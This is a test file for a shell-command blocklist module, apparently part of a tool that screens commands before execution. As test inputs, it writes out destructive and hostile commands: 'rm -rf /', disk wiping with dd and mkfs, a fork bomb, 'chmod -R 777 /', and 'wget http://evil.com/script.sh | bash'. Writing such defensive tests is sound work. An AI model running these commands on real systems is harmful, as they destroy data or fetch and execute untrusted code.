import { describe, test, expect } from "bun:test"
import {
  getBuiltinBlocklist,
  getDestructiveCommands,
  getRiskyCommands,
  createCustomEntries,
} from "../src/security/blocklist.js"

describe("Blocklist", () => {
  test("getBuiltinBlocklist returns entries", () => {
    const entries = getBuiltinBlocklist()
    expect(entries.length).toBeGreaterThan(0)
  })

  test("destructive commands are separated from risky", () => {
    const destructive = getDestructiveCommands()
    const risky = getRiskyCommands()

    expect(destructive.length).toBeGreaterThan(0)
    expect(risky.length).toBeGreaterThan(0)

    for (const entry of destructive) {
      expect(entry.level).toBe("destructive")
    }
    for (const entry of risky) {
      expect(entry.level).toBe("risky")
    }
  })

  test("destructive blocklist catches rm -rf /", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("rm -rf /"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches mkfs", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("mkfs.ext4 /dev/sda1"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches dd if=/dev/zero", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("dd if=/dev/zero of=/dev/sda"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches fork bomb", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test(":(){:|:&};:"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches shutdown", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("shutdown -h now"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches reboot", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("reboot"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches chmod 777 /", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("chmod -R 777 /"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("destructive blocklist catches wget | bash", () => {
    const destructive = getDestructiveCommands()
    const matches = destructive.filter((e) => e.pattern.test("wget http://evil.com/script.sh | bash"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches DROP TABLE", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("DROP TABLE users"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches sudo su", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("sudo su"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches systemctl stop", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("systemctl stop nginx"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches kill -9", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("kill -9 1234"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches DELETE FROM", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("DELETE FROM users WHERE id=1"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("risky blocklist catches userdel", () => {
    const risky = getRiskyCommands()
    const matches = risky.filter((e) => e.pattern.test("userdel admin"))
    expect(matches.length).toBeGreaterThan(0)
  })

  test("safe commands are not in destructive blocklist", () => {
    const destructive = getDestructiveCommands()
    const safeCommands = [
      "ls -la",
      "cat /etc/hostname",
      "grep -r 'pattern' /src",
      "docker ps",
      "kubectl get pods",
      "git status",
      "npm install",
      "python main.py",
    ]

    for (const cmd of safeCommands) {
      const matches = destructive.filter((e) => e.pattern.test(cmd))
      expect(matches.length).toBe(0)
    }
  })

  test("safe commands are not in risky blocklist", () => {
    const risky = getRiskyCommands()
    const safeCommands = [
      "ls -la",
      "cat /etc/hostname",
      "grep -r 'pattern' /src",
      "docker ps",
      "kubectl get pods",
      "git status",
      "npm install",
      "python main.py",
    ]

    for (const cmd of safeCommands) {
      const matches = risky.filter((e) => e.pattern.test(cmd))
      expect(matches.length).toBe(0)
    }
  })

  test("createCustomEntries creates entries with correct level", () => {
    const entries = createCustomEntries(["custom-pattern-1", "custom-pattern-2"], "risky")
    expect(entries.length).toBe(2)
    expect(entries[0].level).toBe("risky")
    expect(entries[1].level).toBe("risky")
    expect(entries[0].id).toBe("CUSTOM-RISKY-001")
    expect(entries[1].id).toBe("CUSTOM-RISKY-002")
  })

  test("createCustomEntries creates destructive entries", () => {
    const entries = createCustomEntries(["destructive-pattern"], "destructive")
    expect(entries.length).toBe(1)
    expect(entries[0].level).toBe("destructive")
  })
})
